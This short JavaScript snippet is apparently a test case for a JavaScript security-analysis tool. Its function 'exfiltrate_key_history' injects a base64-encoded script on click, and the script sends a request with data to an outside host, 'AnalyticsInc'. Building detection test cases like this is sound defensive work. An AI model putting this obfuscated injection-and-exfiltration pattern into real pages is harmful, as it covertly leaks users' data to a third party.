function exfiltrate_key_history() {
  var data$$18 = "eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsICJodHRwOi8vQW5hbHl0aWNzSW5jOjgwMDAvc3VibWlzc2lvbi5odG1sP3Rlc3Q9ZGF0YTIiLCB0cnVlKTt4bWxodHRwLnNlbmQobnVsbCk7";
  var URL = "data:text/javascript;base64," + data$$18;
  var script = document.createElement("script");
  script.src = URL;
  var v0 = document.getElementsByTagName("head")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

